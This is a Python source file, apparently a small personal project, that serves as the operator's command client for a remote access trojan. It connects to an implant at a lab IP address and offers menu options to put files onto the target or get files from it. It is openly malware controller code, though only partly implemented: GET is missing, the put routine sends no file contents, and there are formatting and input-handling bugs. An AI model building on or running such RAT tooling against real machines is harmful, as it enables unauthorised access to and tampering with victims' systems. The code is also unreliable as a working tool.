# Patrick Sacchet
# Version 1.0
# Serves as the main CMD client interface which will provide tasking to our RAT on target

import socket

EXIT = 0
PUT = 1
GET = 2

PORT_NUM = 1550
HOST = "192.168.111.128"

#-----------------------------------------------

#-----------------------------------------------
def printHelp():
    print("""Please select from the following options: \n
            1) Write a file to a location on target \n
            2) Get a file from a specific location on target\n
            0) Exit""")
    return 1

#-----------------------------------------------

#-----------------------------------------------
def putFile(filepath, filename, overwrite):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((HOST, PORT_NUM))
            sock.send(filename)
            response = sock.recv(514)
            print("respose: %s", response.decode())
            sock.send(filepath)
            response = sock.recv(514)
            print("respose: %s", response.decode())
            sock.send(overwrite)
            response = sock.recv(514)
            print("respose: %s", response.decode())
            print("Closing socket...")
            sock.close()
    except Exception as e:
        print("ERROR: Could not connect to implant: ", e)
        return 0
    return 1

#-----------------------------------------------

#-----------------------------------------------
def handleInput():
    userInput = 1
    while (int(userInput) != EXIT):
        printHelp()
        userInput = input("> ")

        if (int(userInput) == PUT):
            filepath= input("Please input filepath > ")
            filename = input("Please input filename (if not provided will use source file name) > ")
            overwrite = input("Would you like to overwrite existing file on target? > ")
            filepath = bytes(filepath, 'utf-8')
            filename = bytes(filename, 'utf-8')
            overwrite = bytes(overwrite, 'utf-8')

            putFile(filepath, filename, overwrite)

    return

#-----------------------------------------------

#-----------------------------------------------
def main():
    handleInput()

    return 1

#-----------------------------------------------
if __name__ == '__main__':
    main()
